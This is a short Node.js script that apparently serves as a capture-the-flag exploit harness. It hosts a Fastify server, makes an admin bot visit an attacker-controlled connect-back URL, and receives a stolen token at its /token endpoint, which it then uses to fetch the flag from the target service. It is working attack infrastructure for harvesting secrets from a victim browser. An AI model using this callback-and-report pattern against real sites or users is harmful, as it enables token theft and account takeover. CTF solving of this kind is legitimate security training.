const path = require("node:path");
const app = require("fastify")();

app.register(require("@fastify/static"), {
  root: path.join(__dirname, "public"),
});

const fail = (message) => {
  console.error(message);
  return process.exit(1);
};

const BOT_BASE_URL = process.env.BOT_BASE_URL ?? "http://localhost:1337";
const WEB_BASE_URL = process.env.WEB_BASE_URL ?? "http://localhost:3000";
const CONNECTBACK_URL = process.env.CONNECTBACK_URL ?? fail("No URL");
const PORT = "8080";

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const reportUrl = (url) =>
  fetch(`${BOT_BASE_URL}/api/report`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ url }),
  }).then((r) => r.text());

app.post("/debug", async (req, reply) => {
  console.debug("[DEBUG] " + req.body);
});

app.post("/token", async (req, reply) => {
  const token = req.body;
  console.log({ token });

  // You got a flag!
  const flag = await fetch(`${WEB_BASE_URL}/get?token=${token}`).then((r) =>
    r.text()
  );
  console.log({ flag });
  process.exit(0);
});

app.listen({ port: PORT, host: "0.0.0.0" }, async (err) => {
  if (err) fail(err);

  await sleep(3 * 1000);
  await reportUrl(
    `${CONNECTBACK_URL}?${new URLSearchParams({
      baseUrl: "http://web:3000",
    })}`
  );

  await sleep(5 * 1000);
  fail("Failed");
});
